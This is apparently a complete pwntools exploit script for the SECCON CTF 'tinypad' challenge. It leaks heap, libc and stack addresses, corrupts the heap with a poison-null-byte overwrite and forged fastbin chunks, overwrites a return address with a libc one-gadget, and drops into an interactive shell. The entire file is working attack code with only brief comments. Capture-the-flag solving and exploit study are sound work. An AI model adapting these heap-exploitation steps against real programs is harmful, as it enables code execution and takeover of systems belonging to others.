from pwn import *

context.bits = 64
context.terminal = ['tmux', 'split-window', '-h']


#p = process('./tinypad')
# p = remote('tinypad.pwn.seccon.jp', 57463)
p = remote('192.168.33.11', 4088)
def attach():
    gdb.attach(p, execute='''
            break *0x400e68
            set $bla=0x602140
            set $cla=0x602040
            c
    ''')
#attach()
def add_memo(memo):
    p.sendline('A')
    p.sendline(str(len(memo)))
    p.sendline(memo)
    return p.readuntil("(CMD)>>> ")

def delete_memo(i):
    p.sendline('D')
    p.sendline(str(i))
    return p.readuntil("(CMD)>>> ")

def edit_memo(index, copy):
    p.sendline('E')
    p.sendline(str(index))
    p.sendline(copy)
    p.sendline('Y')
    return p.readuntil("(CMD)>>> ")

def refresh():
    p.sendline('')
    return p.readuntil("(CMD)>>> ")

p.readuntil("(CMD)>>> ")

### SETUP a fake fast chunk in the tinypad array
f = [
        cyclic(0x100 - 0x20),
        0,
        0x50 | 0b001,
        cyclic(0x50)
    ]

add_memo('Z'*0x100)
edit_memo(1, flat(f))
delete_memo(1)

add_memo('A'*0x80)
add_memo('B'*0x80)
add_memo('C'*0x80)
add_memo('D'*0x80)

delete_memo(3)
q = delete_memo(1)

index_1 = q.index("#   INDEX: 1")
index_3 = q.index("#   INDEX: 3")

heap_leak = u64(q[index_1:][25:29].ljust(8, '\x00'))
libc_leak = u64(q[index_3:][25:31].ljust(8, '\x00'))

libc_base = libc_leak - 0x3be7b8

environ     = libc_base + 0x3c14a0
magic       = libc_base + 0xe66bd

print("HEAP_LEAK", hex(heap_leak))
print("LIBC_LEAK", hex(libc_leak))

delete_memo(2)
delete_memo(4)
### START OVER


### POISON NULL BYTE
add_memo('A'*0x88) #0x88
add_memo('B'*0x100) #0x100
add_memo('C'*0x80) #0x80
delete_memo(2)

edit_memo(1, 'Q'*0x88) # Null byte overwrite

add_memo('b1'*0x40) #0x80
add_memo('b2'*0x20) #0x40

delete_memo(2)
delete_memo(3)

## Fake fast chunks to put on the heap
c = [
        0,
        0x50 | 0b001,
        0,
        cyclic(0x68),

        0,
        0x50 | 0b001,
        0x602120,    # The address of our fake fast chunk in tinypad
        cyclic(0x28),

        0,
        0x50 | 0b001,
        0,
        0,
        0
    ]

# Free this filling our fastbin
delete_memo(4)
add_memo(flat(c)) #D: Overflow into freed fast chunk

add_memo('C'*0x40) # swallow first fastbin
add_memo('A'*0x18 + p64(environ) + p64(0x88) + p64(0x602168) + p64(0x88) + p64(environ)) #Our injected tastchunk, overflow the memo pointers

index_1 = q.index("#   INDEX: 1")

q = refresh()
stack_leak = u64(q[index_1:][22:28].ljust(8, '\x00'))
print("STACK_LEAK", hex(stack_leak))

rsp = stack_leak - 0x1e0
print("fsp:", hex(rsp))

edit_memo(2, p64(rsp+0xf0)) #Address of the return address in made, put it in memo 3

print("Magic addr:", hex(magic))
edit_memo(3, p64(magic)) #edit it

p.sendline("q") #trigger vuln

p.interactive()
